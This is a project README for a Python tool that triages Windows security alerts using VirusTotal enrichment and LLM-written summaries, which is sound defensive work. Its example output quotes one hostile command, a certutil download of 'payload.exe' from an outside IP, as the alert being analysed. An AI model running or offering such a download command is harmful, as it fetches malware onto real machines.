# 🤖 AI-Assisted SOC Alert Triage Assistant

A Python tool that automates Tier 1 alert triage. It reads Windows security
events, enriches indicators (IPs and file hashes) against VirusTotal threat
intelligence, and uses an LLM (Claude) to generate plain-English triage
summaries — what happened, how severe it is, and what a Tier 1 analyst should do
next.

Built as an automation layer on top of my
[SOC Detection Lab](https://github.com/KBS320/SOC-Home-Lab), which generates the
Sysmon events this tool is designed to triage.

**Skills demonstrated:** Python · SOAR-style automation · LLM / AI integration ·
Threat-intel enrichment · VirusTotal API · MITRE ATT&CK · Alert triage

---

## What it does

1. **Reads** Sysmon-style Windows security events
2. **Enriches** any IP address or file hash against the VirusTotal API
3. **Triages** each event with an LLM — severity rating and recommended action
4. **Outputs** a clean, analyst-ready triage report

The enrichment feeds the AI: the threat-intel verdict is passed into the model,
so severity decisions are grounded in real reputation data rather than the
command line alone.

---

## Example output

For a `certutil` download from a known-malicious IP, the tool enriches the
indicators and the LLM escalates appropriately:

```
EVENT 2 — T1105
Command: certutil -urlcache -split -f http://185.220.101.5/payload.exe evil.exe
Threat Intel: IP: 9 vendors flagged as malicious | Hash: 65 vendors flagged as malicious
WHAT HAPPENED: certutil.exe used to download a malicious file from a
flagged IP — a Living-off-the-Land ingress tool transfer (T1105).
SEVERITY: HIGH — hash flagged by 65 vendors, source IP by 9, trusted
binary abused to evade defenses.
RECOMMENDED ACTION: Isolate host, escalate to Tier 2/IR, block the IP,
preserve artifacts, review user activity across the environment.
```

<img width="1912" height="961" alt="AI triage assistant output showing enrichment and LLM triage" src="https://github.com/user-attachments/assets/9f0076c2-12c5-4265-bfce-59f073e074db" />

---

## Architecture

```
Windows host (Sysmon) ──► Splunk ──► triage.py
                                        │
                                        ├─ enrich indicators (VirusTotal)
                                        ├─ AI triage (Claude)
                                        └─ write triage report
```

Current version reads events from a JSON file (demo mode). A live version that
pulls events directly from Splunk's REST API is the next planned phase.

---

## How to run

```bash
# 1. Set up a virtual environment and install dependencies
python -m venv venv
source venv/bin/activate
pip install requests anthropic python-dotenv

# 2. Add your API keys to a .env file (never committed):
#    VIRUSTOTAL_API_KEY=your_key
#    ANTHROPIC_API_KEY=your_key

# 3. Run it
python triage.py
```

Requires a free [VirusTotal](https://virustotal.com) API key and an
[Anthropic](https://console.anthropic.com) API key.

---

## Why I built it

Modern SOCs are adopting AI-assisted triage to cut alert fatigue — a large share
of 2026 security roles now list AI/automation as a required skill. I built a
small working version of that workflow end to end (enrichment → LLM triage →
reporting) to understand it in practice, and to automate the alerts my detection
lab produces.

---

## Roadmap

- [x] Indicator enrichment via VirusTotal
- [x] LLM-based triage and severity rating
- [x] Report generation
- [ ] Live event pull from Splunk REST API
- [ ] Support for additional threat-intel sources (AbuseIPDB, OTX)
